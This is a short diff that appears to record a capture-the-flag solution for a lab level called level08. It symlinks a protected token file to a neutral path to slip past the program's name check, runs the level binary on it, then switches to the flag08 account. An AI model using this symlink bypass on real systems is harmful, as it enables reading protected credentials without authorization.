@@ -1,0 +1,3 @@
+ln -s $PWD/token /tmp/flag
+./level08 /tmp/flag
+su flag08 *flag*
